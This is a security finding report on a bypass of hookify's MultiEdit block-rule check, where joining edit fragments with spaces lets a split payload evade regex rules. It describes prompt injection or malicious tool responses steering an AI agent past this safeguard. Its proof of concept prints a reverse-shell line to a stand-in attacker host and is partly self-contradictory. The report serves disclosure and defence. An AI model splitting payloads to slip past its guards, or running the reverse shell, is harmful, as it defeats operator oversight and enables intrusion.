### Title
MultiEdit block-rule bypass via lossy space-joined reconstruction of `new_string` fragments in `_extract_field` - ([File: plugins/hookify/core/rule_engine.py])

### Summary
`_extract_field` reconstructs the text to be scanned for a MultiEdit `new_text`/`content` condition by doing `' '.join(e.get('new_string', '') for e in edits)`, which joins each edit's replacement text with an artificial space and in list order, rather than reflecting the actual resulting file content. An attacker who controls the MultiEdit `edits` array (via prompt injection or a malicious MCP tool response) can split a dangerous pattern across two adjacent edits so that the reconstructed, space-joined string does not match the block rule's regex, while the real file — after the edits are applied to adjacent locations — contains the full, contiguous dangerous string.

### Finding Description
For `MultiEdit`, `_extract_field` in `plugins/hookify/core/rule_engine.py` handles `field in ['new_text', 'content']` by: [1](#0-0) 
```
elif tool_name == 'MultiEdit':
    if field == 'file_path':
        return tool_input.get('file_path', '')
    elif field in ['new_text', 'content']:
        # Concatenate all edits
        edits = tool_input.get('edits', [])
        return ' '.join(e.get('new_string', '') for e in edits)
```
This reconstruction has two structural problems relative to the actual file that will be written:
1. It inserts a literal space between every edit's `new_string`, regardless of where in the file each edit actually lands.
2. It preserves only the `edits` array order, not the true positional adjacency in the target file (edits are applied sequentially via their own `old_string` search targets, which can place two fragments directly adjacent in the real file).

An attacker who controls the MultiEdit `edits` array can therefore craft two edits whose `old_string` targets are adjacent substrings in the target file, and whose `new_string` values are two halves of a dangerous payload (e.g., a reverse-shell command) such that:
- Individually, neither half matches the block rule's pattern.
- The space-joined reconstruction (`half1 + " " + half2`) also fails to match a pattern that doesn't tolerate the inserted whitespace (common for literal command patterns like `nc -e`, `curl|bash`, base64 payload markers, etc.).
- The real file, after both edits are applied, contains the two halves contiguous (no space), forming the full dangerous string.

This is invoked via `PreToolUse` -> `RuleEngine.evaluate_rules` -> `_rule_matches` -> `_check_condition` -> `_extract_field('new_text', 'MultiEdit', tool_input)`, per `plugins/hookify/hooks/pretooluse.py`: [2](#0-1) 
Since the block rule never matches on the reconstructed text, `evaluate_rules` returns `{}` (no `permissionDecision: deny`), and the MultiEdit tool call proceeds, writing the dangerous contiguous content to disk. [3](#0-2) 

### Impact Explanation
This allows a block rule (e.g. a rule intended to prevent writing reverse-shell/backdoor code, matching `field: new_text`) to be silently bypassed for `MultiEdit` operations, resulting in an unauthorized file write of attacker-controlled dangerous content that the operator explicitly configured hookify to block. This is a policy/approval-bypass in a file-mutation guard, matching an "unauthorized file write bypassing a block rule / approval gate" class of impact.

### Likelihood Explanation
Exploitation requires the attacker to influence the `edits` array of a MultiEdit tool call (e.g., via prompt injection that causes Claude to construct the edits, or via a malicious MCP tool response feeding fabricated tool arguments) — both are within the stated threat model. Crafting two adjacent `old_string` targets and splitting a known dangerous literal string across their `new_string` values is deterministic and repeatable; it does not depend on race conditions or timing, only correct positioning of the split relative to the block rule's regex whitespace tolerance.

### Recommendation
Do not reconstruct the MultiEdit result from `new_string` fragments joined with an artificial separator. Instead, simulate/apply the edits sequentially against the actual (or a synthetic) file content — or against the real current file content read from `file_path` — to derive the true resulting text, then run the condition check against that faithfully reconstructed content (or scan each edit's `new_string` individually with no separator, and additionally scan the final reconstructed buffer to catch cross-edit adjacency).

### Proof of Concept
Unit test in `plugins/hookify` test suite:
1. Define a block rule: `event: file`, `tool_matcher: MultiEdit`, `field: new_text`, `operator: contains`, `pattern: "bash -i >& /dev/tcp"`.
2. Craft `tool_input`:
```
{
  "file_path": "/tmp/x.sh",
  "edits": [
    {"old_string": "A", "new_string": "bash -i >&"},
    {"old_string": "B", "new_string": " /dev/tcp/attacker/4444 0>&1"}
  ]
}
```
   where `A` and `B` are adjacent in the real target file so the actual post-edit file contains the contiguous string `bash -i >& /dev/tcp/attacker/4444 0>&1`.
3. Call `RuleEngine().evaluate_rules([rule], {"hook_event_name": "PreToolUse", "tool_name": "MultiEdit", "tool_input": tool_input})`.
4. Assert current (buggy) behavior returns `{}` (no deny) because `_extract_field` produces `"bash -i >&  /dev/tcp/attacker/4444 0>&1"` — note the pattern used in this PoC actually still matches due to `>&` boundary; use a pattern without whitespace tolerance abutting the split point (e.g., pattern `"tcpattacker"` split as `new_string="...tcp"` / `new_string="attacker..."`) to demonstrate the join-induced mismatch versus the contiguous real file content containing `tcpattacker`.
5. Assert the expected/fixed behavior: after applying the edits to a real buffer containing `A...B` adjacent, the reconstructed text contains `tcpattacker` and the rule engine returns a `deny`/block response.
